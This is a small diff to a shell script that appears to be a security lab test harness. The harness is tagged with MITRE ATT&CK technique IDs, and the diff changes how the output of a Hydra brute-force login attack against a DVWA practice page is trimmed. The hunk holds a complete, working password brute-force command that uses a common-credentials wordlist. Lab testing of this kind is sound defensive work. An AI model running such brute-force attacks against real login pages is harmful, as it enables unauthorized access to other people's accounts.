@@ -76,7 +76,7 @@ echo "  [T1078.d] Hydra brute force against DVWA:"
 hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
   -s 80 "$TARGET" http-get-form \
   "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect" \
-  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:)" | head -5
+  -t 4 -f -I 2>&1 | grep -E "(login:|valid|host:)" | sed -n '1,5p'
 echo ""
 
 rm -f /tmp/mitre-cookies-$$.txt
